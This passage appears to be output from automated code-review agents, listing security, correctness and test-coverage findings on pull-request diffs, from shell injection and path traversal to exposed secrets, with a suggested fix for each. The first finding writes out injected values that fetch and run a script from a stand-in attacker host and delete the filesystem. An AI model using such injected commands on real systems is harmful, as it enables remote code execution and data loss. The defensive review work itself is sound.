`cmd` is an f-string containing `name` and `directory` and is executed with `shell=True`. Any shell metacharacter in either argument escapes the intended `tar` invocation: `create_archive("a; curl attacker.sh | sh #", d)` or `directory="/tmp; rm -rf /"` runs arbitrary commands as the service user.

Fix by dropping the shell and passing an argument list, matching `list_exports` on line 5:

```python
subprocess.run(["tar", "-czf", f"/exports/{safe_name}.tar.gz", "--", directory], check=True)
```

and validate `name` against a strict allowlist (e.g. `^[A-Za-z0-9_-]{1,64}$`) before using it in the output path.

_Also raised by the correctness agent:_ Unquoted f-string into shell=True breaks on spaces and metacharacters

findings.title: No test coverage for new create_archive function
findings.body: create_archive builds a shell command via string interpolation and executes it with shell=True. There is no test verifying correct behavior for normal inputs, nor any test that would catch a regression or malicious input handling (e.g. names/directories containing shell metacharacters). Since this file doesn't otherwise show existing tests, at minimum a test for the happy path and for inputs with special characters would catch both functional regressions and injection issues.

findings.title: Wildcard CORS origin combined with credentials: true
findings.body:
`dashboardCors` sets `origin: "*"` together with `credentials: true`, which removes the origin allowlist that the existing export on lines 6-7 relies on (`origin: ALLOWED`).

Adversary: the operator of any website a logged-in user visits. What they control: the `Origin` header of a cross-site `fetch(..., {credentials: "include"})` from the victim's browser. What they get: if the middleware ever echoes the request origin (several `cors` wrappers and proxies do, and `origin: "*"` is commonly "fixed" later by switching to `origin: true`, which reflects), the attacker's page reads authenticated responses from any route this middleware is mounted on — full session-scoped data exfiltration, plus state-changing requests whose responses are readable, defeating CSRF token read protection.

Note the caveat, which is why this is not confidence 1.0: the `cors` npm package with a literal `"*"` emits `Access-Control-Allow-Origin: *`, and browsers reject that response when credentials are included. So as written the combination is more likely to be *broken* than immediately exploitable — but it is one character away from reflecting (`origin: true`), and any intermediary or custom handler that reflects makes it live today.

Fix: give the dashboard its own explicit origin, e.g. `origin: [DASHBOARD_ORIGIN]` (or add it to `ALLOWED`), and keep `credentials: true` only against that finite list. Never pair `*` or a reflecting origin function with credentials.

findings.title: origin "*" with credentials:true is rejected by browsers
findings.body:
The `cors` middleware emits the literal header `Access-Control-Allow-Origin: *` when `origin` is the string `"*"`. The Fetch/CORS spec forbids the wildcard on credentialed requests: any request sent with `credentials: 'include'` (or `withCredentials`) whose response carries `*` is blocked by the user agent, and the cookies are never attached. So this config does the opposite of the stated goal — the dashboard will get CORS errors rather than working cookie auth.

Use a value that echoes a concrete origin instead, e.g. `origin: DASHBOARD_ORIGIN` (a specific URL) or an origin-callback that validates against an allow-list, keeping `credentials: true`. That also avoids the incidental effect of this export widening the existing `ALLOWED` restriction on lines 6-7 wherever it is mounted.

findings.title: dashboardCors: wildcard origin + credentials contradicts CORS spec
findings.body: The `dashboardCors` configuration sets `origin: "*"` with `credentials: true`. Browsers reject this combination: when credentials are included, the origin must be a specific domain, not a wildcard. Either this configuration will fail at runtime with a browser error, or the `credentials: true` line will be silently ignored. A code comment explaining the intended behaviour (and whether this is temporary/exploratory) would prevent a caller from misunderstanding what this CORS policy actually does.

findings.title: New dashboardCors export has no test coverage
findings.body: The new `dashboardCors` middleware combines `origin: "*"` with `credentials: true`, an invalid/unsafe CORS configuration in most CORS implementations (browsers reject wildcard origin with credentials, and some libraries silently reflect the origin instead). There is no test verifying the actual behavior of this exported middleware (e.g., what `Access-Control-Allow-Origin` header it produces for a given request, or whether credentials are actually honored). If this configuration is wrong, nothing in the suite would fail.

findings.title: Live AcmePay secret key hardcoded, replacing env var lookup
findings.body:
`ACMEPAY_SECRET_KEY` is a literal `acme_live_...` credential committed to the repository, and `client()` now assigns it to `acmepay.api_key` instead of reading `os.environ["ACMEPAY_SECRET_KEY"]` (the `import os` and the env lookup were both removed in this hunk). The `acme_live_` prefix indicates a production key, not a sandbox one.

Adversary: anyone with read access to this repository or its clones, forks, CI logs, mirrors, or build artifacts \u2014 including anyone who later gains access to a single developer workstation. They control nothing; they simply read the file and obtain the ability to issue charges, refunds and reads against the production payments account.

Remedy: (1) treat this key as compromised and rotate it at AcmePay immediately \u2014 removing it in a follow-up commit does not help, git history retains it; (2) restore the `os.environ["ACMEPAY_SECRET_KEY"]` lookup (or a secrets-manager fetch) and keep `import os`; (3) purge the value from history if the repo is public or widely mirrored.

findings.title: Per-environment key configuration removed; all envs now use live key
findings.body: `client()` previously resolved the API key from `os.environ["ACMEPAY_SECRET_KEY"]`, so each deployment supplied its own key and a missing key failed loudly at call time. It now unconditionally assigns a module-level constant whose value is prefixed `acme_live_`. Every environment that runs this code — staging, CI, local dev — will authenticate against the live payments account and issue real charges, with no override path. Restore the environment lookup (or accept the key as a parameter / config object) so non-production environments can be pointed at test credentials.

findings.title: fake_client() return shape does not match client()
findings.body: `client()` returns the `acmepay` module itself, so callers invoke API methods on the result (e.g. `client().Charge.create(...)`). `fake_client()` returns a plain dict `{"api_key": ...}`, which exposes no such methods. Any test that patches `client` with `fake_client` will fail with `TypeError`/`KeyError` rather than exercising the code path, or will only pass because the assertion never touches the returned object. Make the fixture return a stub object with the same surface the production code calls.

findings.title: tenant_of returns an unverified, attacker-controlled tenant id
findings.body:
`tenant_of` calls `jwt.decode(..., options={"verify_signature": False})`, so the payload is parsed straight from the token with no signature check and no expiry/audience validation. Anyone can craft a token with an arbitrary `tenant_id` and have this function return it. If any caller uses the result to scope a query or an authorisation decision, that is cross-tenant access.

The verified path already exists two lines above: implement this as `return claims_for(token)["tenant_id"]` (or take an already-verified claims dict as the parameter) so the tenant id comes from a signature-checked payload. If the intent was genuinely to avoid a key-store round trip, the key material should be cached rather than the verification skipped.

_Also raised by the security agent:_ tenant_id read from an unverified JWT — forgeable tenant identity

findings.title: Public function lacks documentation of security implications
findings.body:
The `tenant_of()` function reads the tenant ID from an unverified JWT token. This is a public API (exported at module level) whose safety depends entirely on how callers use it. Callers could easily misunderstand that this function performs no signature verification and use it in contexts requiring authenticated data, leading to security errors. Document explicitly: (1) that this performs no signature verification, (2) when it is safe to call it (e.g., only for routing before full verification), and (3) that callers must separately verify the token with `claims_for()` if they need authentication.

_Also raised by the correctness agent:_ Unguarded subscript raises KeyError when tenant_id is absent

findings.title: No test covers tenant_of()'s unverified-signature behavior
findings.body: tenant_of() decodes the token with verify_signature=False and returns unverified['tenant_id']. There is no test in this diff exercising this function, so a regression (e.g. someone 'fixing' it to trust an attacker-supplied tenant_id, or breaking the extraction logic entirely) would not be caught by any existing suite. Given this bypasses signature verification — a security-sensitive behavior — at minimum a test should assert that a token with a forged/unsigned tenant_id claim is still accepted as-is (documenting the intentional trust boundary) and that tenant_of extracts the correct field.

findings.title: Missing ownership check lets any user edit another's payment method
findings.body:
`update_payment_method` resolves `pm_id` straight from the request and writes `body["billing_name"]` to it, then saves — with no `require_owner(user, pm)` call. The `user` returned on line 11 is never used, which is the tell: authentication happens, authorisation does not.

Adversary: any authenticated user of the API. What they control: the `pm_id` path/query parameter and the request body. What they get: the ability to enumerate payment method IDs and rewrite the billing name on any other account's saved card — a data-integrity break on a payment object, and a plausible stepping stone for social-engineering or chargeback abuse.

Fix: call `require_owner(user, pm)` immediately after `PaymentMethod.get(pm_id)` and before any mutation, mirroring line 6 in the read handler directly above.

_Also raised by the correctness agent:_ update_payment_method mutates object without require_owner check

_Also raised by the correctness agent:_ Unhandled missing record and missing body key

findings.title: Function violates documented mutation authorization convention
findings.body: The function `update_payment_method` mutates a PaymentMethod object without calling `require_owner()`. The repository convention is explicit: the docstring for `require_owner()` states 'Every object mutation must call this.' The `get_payment_method()` function on line 6 follows this pattern. This function does not, creating a contract violation where callers relying on the documented convention would be misled about what authorization checks occur.

findings.title: No test covers update_payment_method, including missing authz check
findings.body: update_payment_method is new and untested. Notably it omits the require_owner(user, pm) call that the neighboring get handler (line 6) performs, meaning a user could update another user's payment method. Since this is a security-relevant regression from the established pattern in this file, a test exercising 'user A cannot update user B's payment method' would have caught it, but no such test exists in this diff.

findings.title: Rate limit removed from unauthenticated password reset endpoint
findings.body:
`request_reset` is an unauthenticated entry point that takes an attacker-supplied `email` and calls `send_reset_email(email)` with no remaining throttle. Any remote party can now script this to (a) mail-bomb a chosen victim's inbox with reset messages, (b) burn the account's reset-token budget / enable token-guessing volume, and (c) run cost- and reputation-amplification against your email provider. The PR rationale — "the email provider already throttles" — does not cover this: provider throttles are per-sending-account and protect the provider's own infrastructure, not a single targeted recipient, and they also do not bound how many reset tokens your application mints. If the limiter must move, replace it with an equivalent per-recipient/per-IP limit at the new layer before dropping this one; otherwise restore the decorator.

_Also raised by the correctness agent:_ Password reset loses its per-caller bound; provider throttling is not equivalent

findings.title: No test evidence that rate-limit removal is safe/covered
findings.body: The diff removes the `@rate_limit("5/hour")` decorator from `request_reset`, changing its behaviour so it can now be called an unlimited number of times. No test file is included in this diff, so there is no way to tell whether a prior test asserted the presence of throttling (which would now need updating) or whether the removal is otherwise safe. If a test previously relied on the decorator (e.g., expecting a 429 after N calls), it should have been updated or removed alongside this change; if no such test exists, this is a security-relevant behaviour change shipping with zero verification either way.

findings.title: Preview reader skips _confined(), allowing arbitrary file reads
findings.body:
The existing reader resolves the caller-supplied `name` through `_confined(name)` (line 14) before opening it; `read_export_preview` instead builds the path with a raw `os.path.join(EXPORT_ROOT, name)`. Since `name` is untrusted input from the same source as the download path, `../../etc/passwd` traverses out of EXPORT_ROOT, and an absolute `name` makes `os.path.join` discard EXPORT_ROOT entirely and open that absolute path. The first `limit` bytes of any file readable by the process are then returned to the caller.

Fix: route the preview through the same helper — `path = _confined(name)` — so both entry points share one confinement check rather than two divergent path constructions.

_Also raised by the security agent:_ Preview path skips _confined(), allowing path traversal file read

findings.title: Public function name suggests path safety but does not enforce it
findings.body: `read_export_preview` is a public function (no leading underscore) that accepts a `name` parameter, just like `read_export` on line 14. However, `read_export` applies `_confined(name)` path confinement on line 14, while `read_export_preview` does not. A caller reading the signature and comparing it to the sibling function would reasonably expect the same safety guarantees. The function name and public API contract — accepting a user-supplied name — suggest it should prevent path traversal, but the code does not enforce this.

findings.title: No test covers read_export_preview, including its unconfined path handling
findings.body: read_export_preview builds path via os.path.join(EXPORT_ROOT, name) directly, unlike the existing download path which calls _confined(name). No test in this diff exercises this new function, so a regression (e.g. accepting '../' in name, or reading beyond EXPORT_ROOT) would pass silently. At minimum a test verifying the function reads within EXPORT_ROOT and respects the limit parameter is needed.

findings.title: Ownership check removed from bulk_export enables cross-tenant reads
findings.body:
`bulk_export` previously called `require_owner(user, report)` for every fetched report; the loop and the `require_owner` import were both removed. The function now fetches `Report.get(rid)` for every caller-supplied id in `report_ids` and returns `r.to_dict()` unconditionally.

Adversary: any authenticated user of any tenant. What they control: the `report_ids` list in the request. What they get: the full serialized contents of any other tenant's reports, by enumerating or guessing report IDs — no second account, no victim interaction needed.

Authentication (`current_user`) is not authorisation. Restore the check, or push it into the fetch so the query is scoped to the tenant, e.g. `reports = Report.get_many(report_ids, tenant_id=user.tenant_id)` and reject/omit ids that do not belong to the caller. If the loop was removed for performance, the fix is a single tenant-scoped bulk query, not dropping the control.

_Also raised by the correctness agent:_ bulk_export no longer checks report ownership (cross-tenant read)

findings.title: No test guards against cross-tenant data exposure in bulk_export
findings.body: The per-object ownership check (require_owner) was removed from bulk_export, but no test file is part of this diff. If there is an existing test asserting that a user cannot export another tenant's reports, it would need to be updated to fail against this change — but none is shown, meaning this authz regression could ship with nothing to catch it. Add a test that calls bulk_export with report_ids belonging to a different tenant and asserts a Forbidden error is raised (or that those reports are excluded).

findings.title: PR description contradicts authorization removal
findings.body: The pull request claims callers are 'already authenticated' as justification for removing the ownership check. Authentication and authorization are distinct: authentication verifies who you are, while authorization verifies what you are allowed to access. The `require_owner` function in api/auth.py (lines 1-5) explicitly states that 'every object read or mutation of another tenant's data must go through this.' Removing this check without updating that contract documentation leaves the documented guarantee false: the function no longer enforces the stated requirement.

findings.title: SQL injection via f-string interpolation in search_customers
search_customers bypasses execute()'s parameterised contract
findings.body: `billing.db.execute` documents that `params` "must carry every caller value", and the sibling `get_customer` on line 5 follows that by passing `(customer_id,)` with a `%s` placeholder. `search_customers` instead formats the values directly into the SQL text and calls `execute(sql)` with no params. Beyond the obvious injection exposure, this is simply incorrect for reachable inputs: a term like `O'Brien` closes the quote and yields a syntax error, and `term=None` or `status=None` interpolates the literal text `None` rather than matching NULL. Rewrite as `execute("SELECT * FROM customers WHERE name LIKE %s AND status = %s", (f"%{term}%", status))` so the driver quotes and escapes both values.

findings.title: No test covers search_customers behaviour or its unparameterised query
findings.body: search_customers builds SQL via an f-string and calls execute(sql) without params, bypassing the parameterised-query convention shown in get_customer and documented in billing/db.py. No test exercises this function, so a change (or the current injection risk) would not be caught — e.g. no test asserts that execute is called with a parameterised query and bound params, or that special characters in term/status are handled safely.

findings.title: verify_endpoint bypasses the ALLOWED_HOSTS check used by the send path
findings.body:
The function immediately above validates `host not in ALLOWED_HOSTS` before issuing the request, but `verify_endpoint` takes a caller-supplied `url` and passes it straight to `requests.get` with no equivalent check. Since this URL comes from a tenant registering a webhook target, the same input that is rejected on line 8-9 for the POST path is fetched unconditionally here, and the returned status code leaks the result back to the caller. Apply the same host parsing and allow-list check before the request (and consider `allow_redirects=False`, since a permitted host can redirect to an internal one).

_Also raised by the security agent:_ verify_endpoint bypasses the ALLOWED_HOSTS check (SSRF)

findings.title: verify_endpoint raises instead of returning a status for unreachable URLs
findings.body: A function named `verify_endpoint` that returns a status code will be called precisely on endpoints that may be wrong or down. For a DNS failure, refused connection, TLS error, or the 5s timeout, `requests.get` raises (`ConnectionError`, `Timeout`, `SSLError`) rather than returning a response, so the declared return shape (an int status code) is never produced and the exception propagates to the registration flow. Catch `requests.RequestException` and return a sentinel, or document that callers must handle it.

findings.title: verify_endpoint has no test and bypasses host allowlist check
findings.body: verify_endpoint issues a GET to an arbitrary url without the ALLOWED_HOSTS check applied a few lines above for the POST path. No test exists to pin down whether this is intentional or whether it should validate the host first. If someone later 'fixes' this inconsistently, nothing would catch a regression either way.

findings.title: Customer invoices bucket created with all public access blocks disabled
findings.body:
This PR is described as adding a public assets bucket for the marketing site, but it also declares `aws_s3_bucket.invoices` (`acme-customer-invoices`) and attaches an `aws_s3_bucket_public_access_block` with `block_public_acls`, `block_public_policy`, `ignore_public_acls` and `restrict_public_buckets` all set to `false`.

Adversary: any unauthenticated internet user, plus any principal (CI role, developer, compromised credential) that can set an object ACL or bucket policy on this bucket. What they control: the ACL/policy grant, since the account-level guardrail that would have rejected or ignored a `public-read` grant is switched off. What they get: read — and with a public-write ACL, write — access to customer invoices, i.e. names, addresses, amounts and other billing PII.

Note the nuance: turning the block off does not by itself publish objects; a public ACL or policy still has to exist. But the public access block is precisely the control that exists to make such a grant harmless, and here it is disabled by default on a bucket that has no business being reachable anonymously.

Recommended: for the invoices bucket set all four flags to `true` (or omit the resource and rely on the S3 default, which now blocks public access). If a marketing bucket genuinely needs public objects, keep the relaxed block scoped to `aws_s3_bucket_public_access_block.assets` only, and consider fronting it with CloudFront + OAC instead. Also add `aws_s3_bucket_server_side_encryption_configuration` and versioning for the invoices bucket.

_Also raised by the correctness agent:_ Diff adds an invoices bucket with all public-access blocks disabled

findings.title: verify_acmepay compares HMACs with == instead of compare_digest
findings.body:
`verify_acmepay` is otherwise identical to `verify_stripe` three lines above, but returns `expected == header` rather than `hmac.compare_digest(expected, header)`. Python's `==` on str short-circuits at the first differing character, so the comparison time leaks how many leading hex characters of the expected digest the attacker got right, allowing a signature to be recovered byte-by-byte over repeated requests. There is no reason for the two providers to differ here; change line 12 to `return hmac.compare_digest(expected, header)`.

Secondary behavioural note: the two helpers now also differ on bad input. `compare_digest` raises `TypeError` when `header` is `None` or a non-ASCII `str`, while `==` quietly returns `False`. Any caller that currently relies on `verify_stripe` raising for a malformed header will see `verify_acmepay` behave differently; switching to `compare_digest` also makes that behaviour consistent.

_Also raised by the security agent:_ Webhook signature compared with `==` instead of compare_digest

findings.title: verify_acmepay added with no test coverage
findings.body: The new verify_acmepay function (lines 10-12) has no test exercising valid/invalid signature cases. Nothing in this diff would fail if the comparison logic were wrong (e.g. inverted, or using a non-constant-time equality as it currently does). Add tests mirroring whatever coverage verify_stripe has (matching and mismatching header cases) for verify_acmepay.

findings.title: 500 handler returns exception text and full traceback to the client
findings.body:
`handle()` previously returned a fixed `{"error": "internal error"}` body; it now returns `str(exc)` plus `traceback.format_exc()` in the response payload. Any client that can make the service raise — malformed JSON, a bad path parameter, an oversized field — gets back absolute filesystem paths, module and framework versions, source lines from the frame, and the repr of values embedded in the exception message. Driver exceptions are the worst case: psycopg/SQLAlchemy/requests errors routinely carry connection strings, hostnames of internal services, and fragments of the failing SQL, so this can hand an unauthenticated user a map of the internal topology and occasionally a credential.

The on-call need is already met by the line above it: `log.exception("request failed")` writes the same traceback to the logger. Keep the body generic and correlate instead — generate a request/error id, log it alongside the exception, and return only `{"error": "internal error", "error_id": <id>}`. If the traceback really must be reachable over HTTP, gate it on an explicit debug setting that is off by default in production config rather than on the unconditional path.

_Also raised by the correctness agent:_ format_exc() yields 'NoneType: None' outside an except block

_Also raised by the correctness agent:_ 500 response body shape and `error` value are no longer stable

findings.title: No test covers the new error response contract
findings.body: The `handle` function's return value changed from a generic error message to including `str(exc)` and a full traceback. There is no test in this diff verifying the new response shape (keys, status code, or content). If this behavior were wrong — e.g. it silently reverted to the old message, or accidentally included the wrong data — nothing would fail. Given this is a security-sensitive change (exposing internal details to callers), it warrants at least a basic test asserting the returned dict structure and status code.

findings.title: Reset-path passwords hashed with unsalted MD5 instead of bcrypt
findings.body:
`hash_reset_password` stores a user-supplied password as a bare, unsalted MD5 digest. MD5 is a fast hash (billions of guesses/second on commodity GPUs) and without a per-user salt the digests are directly lookupable in precomputed rainbow tables, so any password set or changed through the reset flow is recoverable in effectively plaintext form.

Adversary: anyone who obtains a copy of the credential store — via SQL injection, a leaked backup, a compromised replica, or an insider. What they control: nothing; they only need read access to the stored digests. What they get: the users' plaintext passwords, which are commonly reused against other services.

This also splits the module against itself: `hash_password` on line 7 already does the right thing. Reuse it — `return bcrypt.hashpw(raw.encode(), bcrypt.gensalt()).decode()` — so the reset path and the signup path produce the same verifier format, and make sure verification code can handle both while any legacy MD5 values are rehashed on next login.

If this function is in fact hashing a single-use reset *token* rather than a user-chosen password, it should still be a salted/slow hash or at minimum SHA-256 over a high-entropy token, and the name should say so.

findings.title: New reset-password hashing function has no test coverage
findings.body: hash_reset_password is new, security-sensitive code (used in a password reset path) but the diff adds no test for it. Nothing would fail if this function were changed to something insecure, broken, or inconsistent with hash_password's behavior. At minimum a test should assert the function produces a deterministic-format digest and that reset-password verification round-trips correctly.

findings.title: Reset hash returns MD5 hex, incompatible with bcrypt verification
findings.body: `hash_password` returns a bcrypt modular-crypt string (`$2b$...`), which callers must verify with `bcrypt.checkpw`. `hash_reset_password` returns a bare 32-char MD5 hex digest. If the reset flow writes this value into the same user password column, subsequent login verification via `bcrypt.checkpw` will raise or return False for every reset account — `checkpw` rejects a non-bcrypt salt string rather than reporting a mismatch. Either the reset path needs its own storage column plus a matching verifier, or it should call `hash_password` so one format is stored everywhere. Note there is no corresponding `verify_reset_password` in this diff, so nothing here can consume the value it produces.

findings.title: pull_request_target runs fork-controlled code with NPM_TOKEN
findings.body:
`pull_request_target` runs in the context of the base repository: it has access to repository secrets and a read/write `GITHUB_TOKEN`, unlike `pull_request` on forks. Line 12 then checks out `github.event.pull_request.head.sha`, i.e. the attacker's branch contents, and line 13 executes `./scripts/measure.sh` from that checkout with `secrets.NPM_TOKEN` injected on lines 14-15.

Entry point: any unauthenticated GitHub user opens a pull request from a fork. Sink: `./scripts/measure.sh` (and anything it imports, e.g. a lockfile/postinstall step) executed by the runner shell. What they get: the plaintext `NPM_TOKEN` (trivially exfiltrated with a single `curl`), plus whatever the job's `GITHUB_TOKEN` can do in the base repo. No maintainer review or approval is required before the job runs.

Fixes, in order of preference:
1. Revert to `pull_request` and accept that forks do not get secrets; have the size check run without `NPM_TOKEN`, or publish the measurement from a separate `workflow_run` job that never checks out fork code.
2. If a privileged step is genuinely needed, split it: an unprivileged `pull_request` job produces an artifact, and a `workflow_run`/`pull_request_target` job consumes only that data and never executes code from the head ref.
3. At minimum, do not check out the head SHA under `pull_request_target`, set `permissions: contents: read`, and never pass secrets to a step that runs PR-supplied code.

_Also raised by the correctness agent:_ pull_request_target + fork head checkout runs untrusted code with NPM_TOKEN

findings.title: Workflow definition now comes from base branch, and size reflects head not merge
findings.body:
Two behaviour changes come along with `pull_request_target` that may not be intended:

1. The workflow file itself is always taken from the base branch, so any change a PR makes to `.github/workflows/size.yml` will not take effect until merged. Contributors editing the size check will see stale behaviour with no indication why.
2. The default `actions/checkout` ref for `pull_request` is the `refs/pull/N/merge` commit, i.e. the PR merged into the base. Pinning to `head.sha` (line 12) measures the PR branch in isolation, so the reported size ignores anything that changed on the base branch since the PR was opened. If the size number is compared against a base-branch baseline, the two are no longer computed on comparable trees.

If this is intentional, it is worth a comment; if not, `refs/pull/${{ github.event.pull_request.number }}/merge` restores the previous semantics (though it does not address the credential-exposure issue reported separately).

findings.title: Non-JSON-serialisable context values now raise TypeError
findings.body:
The old key, `(template_source, tuple(sorted(context.items())))`, accepted any *hashable* value: datetimes, `Decimal`, enums, model objects with `__hash__`, `UUID`. The new key requires every value to be *JSON-serialisable*, and `json.dumps` raises `TypeError: Object of type X is not JSON serializable` for all of those. Any existing caller that passes such a value into a render context — common for template rendering — goes from a working cached render to an uncaught exception at line 9, before `_render` is ever reached.

If you want a digest key, make the serialisation total: pass `default=repr` (or a project-specific encoder) to `json.dumps`, or build the digest from the old sorted-items tuple via `repr`. Either way add a test rendering a context containing a non-JSON type.

findings.title: JSON-based key hashing changes equality semantics, untested
findings.body: Switching the cache key from `tuple(sorted(context.items()))` to `json.dumps([template_source, context], sort_keys=True)` changes what counts as an equal context. Values that were previously distinguished by type (e.g. a tuple vs a list, or non-JSON-serializable objects like sets/datetimes) will now either collide (tuple and list serialize identically) or raise TypeError where the old key construction would have worked or differed. None of the three tests exercise context values other than plain ints, so this behavior change is not covered.

findings.title: Test only checks shell=False, not the actual argv list built
findings.body: `test_runs_without_a_shell` asserts `spy.last_call.kwargs["shell"] is False` but never inspects the positional args passed to `subprocess.run` (the list `["tar", "-czf", f"/exports/{name}.tar.gz", "--", directory]`). The security-relevant part of this change is that the command is now an argv list (preventing shell interpolation) rather than a single string — that is what actually prevents injection. If someone regressed the code to build a single command string but forgot to also flip `shell=True`, or dropped the `--` separator so `directory` could be interpreted as a flag, this test would still pass because it never looks at `spy.last_call.args`. Add an assertion on the actual argv, e.g. `assert spy.last_call.args[0] == ["tar", "-czf", "/exports/nightly.tar.gz", "--", "/srv/data"]`.

findings.title: `directory` reaches tar unvalidated — arbitrary path read if caller-controlled
findings.body:
`name` is now constrained by `SAFE_NAME`, but `directory` is passed straight through to `tar` as a file operand with no validation. The `--` on line 12 does correctly stop option parsing, so this is not argument injection (no `--checkpoint-action=exec=...`), but it does not constrain *which* path is archived. If any caller of `create_archive` derives `directory` from a request parameter, the attacker supplies e.g. `/root` or `/etc` and gets its contents written into `/exports/<name>.tar.gz`, which — given the name suggests an export/download area — is plausibly retrievable.

Suggest constraining `directory` the same way `name` was: resolve it (`os.path.realpath`) and require it to sit under an expected root before invoking tar. If every caller is internal and already passes a trusted constant, a comment to that effect would close this out.

findings.title: New name allowlist rejects dots, breaking dated/dotted archive names
findings.body:
`SAFE_NAME` permits only `[A-Za-z0-9_-]`, so any caller that previously passed a name containing a dot, space, or slash-free date separator (e.g. `nightly.2024-01-01`, `tenant.42`) now gets a `ValueError` instead of a `CompletedProcess`. The old implementation interpolated the name straight into the command, so those names worked. This is a silent contract change for every existing call site: `create_archive` gained a new exception type that no caller can be expected to handle.

If dots are genuinely unwanted in the output filename, that is fine, but it should be a deliberate, announced change; otherwise widen the class to include `.` (while still rejecting `..`, `/` and leading `-`) so existing names keep working. No call sites were retrievable here, so please confirm what name shapes are in use before merging.

findings.title: directory is no longer shell-expanded; globs and multi-path strings now fail
findings.body:
Under the old `shell=True` form, `directory` was word-split and glob-expanded by the shell, so callers could legitimately pass `"/srv/data /srv/logs"` or `"/srv/data/*"`. With the list form, the whole string becomes a single literal argv element, so those calls will now make `tar` exit non-zero and, because `check=True`, raise `CalledProcessError` rather than producing an archive.

This is the correct direction for safety, but it is a behaviour change worth confirming against real call sites. If multiple roots are a supported use case, change the parameter to accept a sequence and splat it into the argv list (`["tar", "-czf", dest, "--", *directories]`).

findings.title: test_renders_empty_invoice has no assertion
findings.body:
This test calls render(Invoice(lines=[])) but never checks the return value or any side effect. It will pass even if render() raises a wrong value, returns None, or produces malformed output for empty invoices — as long as it doesn't throw. Add an assertion on the actual rendered output for the blank-invoice case.

_Also raised by the correctness agent:_ test_renders_empty_invoice asserts nothing about the result

findings.title: Test asserts only mock call_count, not rendered output
findings.body:
test_renders_line_items patches format_line and only checks that it was called twice. It never inspects the actual string returned by render(), so if format_line's output is mis-concatenated, mis-ordered, or dropped, this test would still pass. Assert on the rendered result (e.g. that it contains the formatted line items in order) rather than just call_count.

_Also raised by the correctness agent:_ Line-item test verifies call count only, with the formatter mocked out

findings.title: Failing boundary test deleted instead of updated; no fix in diff
findings.body:
The PR description says the rounding was fixed and the test asserting the old behaviour was dropped, but this diff contains no change to `round_cents` — only the removal of `test_rounds_half_to_even`. Two problems follow. First, if the behaviour genuinely changed, the correct action is to update the assertion (e.g. `round_cents(Decimal("2.345")) == Decimal("2.35")` under the new rule), not to delete it: `2.345` is the exact half-way boundary and is the single most valuable case in this file, since the remaining `test_rounds_up_above_half` only exercises a strictly-above-half input and cannot distinguish half-to-even from half-up. Second, deleting a red test with no accompanying source change makes the suite green without demonstrating that anything was fixed. Please restore the case with the expected new value, and include the `round_cents` change in this PR so the two can be reviewed together.

_Also raised by the tests agent:_ Rounding fix has no test after deletion of test_rounds_half_to_even

findings.title: Test will not execute the retry path it claims to test
findings.body:
Because the patch target is wrong, `deliver` will never return False as patched, so the loop in `send_with_retry` will attempt delivery on all three iterations using the real (unpatched) function. The test may pass or fail depending on actual network behavior, but it will not reliably test the retry exhaustion path that the test name claims to cover.

_Also raised by the correctness agent:_ Patch target misses the name actually used by send_with_retry

_Also raised by the tests agent:_ Mock target does not affect the code under test

findings.title: Test patches wrong target; contradicts documented behavior
findings.body:
The test `test_send_gives_up_after_three_failures` patches `notify.transport.deliver`, but the module docstring in `notify/sender.py` explicitly documents that `deliver` is bound into the sender module's namespace at import time. This means the patch target must be `notify.sender.deliver` to actually affect the code under test. The current patch will not work as intended, making this test unable to verify the documented retry behavior.

Change line 7 to: `mocker.patch("notify.sender.deliver", return_value=False)`

findings.title: csv_rows joins raw values without calling csv_escape
findings.body:
`csv_rows` builds each line with `",".join(str(r.get(c, "")) ...)` and never passes the values through `csv_escape`, which is defined immediately below it in the same module for exactly this purpose. Any cell whose value contains a comma or a double quote will silently shift the remaining columns of that row, producing a file that parses with the wrong number of fields. Wrap each rendered value: `",".join(csv_escape(str(r.get(c, ""))) for c in columns)`.

_Also raised by the security agent:_ csv_rows joins values without using csv_escape

findings.title: New exporter logic added with no accompanying tests
findings.body: This PR introduces csv_rows, csv_escape, dump_streaming, dump_pretty, margins_for, and usable_width, but no test file is touched. The repo's only exporter test (test_csv.py) covers just csv_header. Any of these new functions could be wrong — e.g. csv_escape has an off-by-one edge case for values containing newlines, dump_streaming's chunk boundaries, or margins_for's integer-division rounding — and nothing would catch it.

findings.title: csv_escape does not quote values containing newlines
findings.body: The quoting condition only tests for `,` and `"`. A value containing a newline (or carriage return) is returned unquoted, which splits a single logical record across two physical lines and corrupts the output for any consumer that reads line by line — including `csv_rows`, which produces one string per row. Extend the condition to cover `\n` and `\r`.

findings.title: Date comparison against wall clock is flaky at UTC midnight
findings.body:
`issue_token()` stamps `issued_at` from the clock at one instant, and `datetime.now(timezone.utc)` is read at a later instant. If the test runs within the last few microseconds of a UTC day, the two calls land on different dates and the assertion fails for no reason related to the code under test. Freeze or inject the clock (the same way `test_token_expires_after_an_hour` passes an explicit `now=`), e.g. capture `before = datetime.now(timezone.utc)` and `after = ...` and assert `before <= token.issued_at <= after`, or have `issue_token` accept a `now` parameter.

_Also raised by the tests agent:_ New test depends on real time, not the expiry boundary

findings.title: `is_expired` called without the `now=` argument used elsewhere
findings.body: The existing test always supplies `now=` explicitly (line 6). This new call omits it, so it depends on `is_expired` having a clock-reading default — and if that default exists, the assertion is again tied to real time rather than to a controlled instant. Pass `now=` here as well so the test asserts a deterministic relationship between `issued_at`, `expires_at` and a fixed instant.

findings.title: No test covers the expired-coupon rejection branch
findings.body: apply_coupon now raises CouponExpired when coupon.expires_at is in the past, but the only test updated (test_apply_coupon_reduces_total) uses a coupon expiring tomorrow, so it never exercises line 9-10. If the comparison were inverted, the exception type wrong, or the check silently removed, no test would fail. Add a test that constructs a coupon with an expires_at in the past and asserts CouponExpired is raised.

findings.title: expires_at may be None or naive, raising TypeError instead of applying
findings.body: `coupon.expires_at < datetime.now(timezone.utc)` will raise `TypeError: '<' not supported between instances of 'NoneType' and 'datetime.datetime'` for any coupon with no expiry set, and `TypeError: can't compare offset-naive and offset-aware datetimes` if the stored value is naive (which is common when it comes from a DB column without timezone). Either case turns a valid coupon into an unhandled 500 rather than a `CouponExpired`. Guard explicitly, e.g. `if coupon.expires_at is not None and _as_utc(coupon.expires_at) < datetime.now(timezone.utc):`, normalising naive values before comparison.

findings.title: Blocking requests.get inside an async function stalls the event loop
findings.body:
`fetch_plan_limits` is a coroutine but never awaits anything; it calls the synchronous `requests.get`, which blocks the thread running the event loop until the billing service replies or the 5s timeout fires. During that window every other task on the loop — including in-flight request handling — makes no progress, so a slow `billing.internal` degrades the whole process, not just the caller. Since this is invoked during request handling as the PR describes, that is a latency amplifier under concurrency.

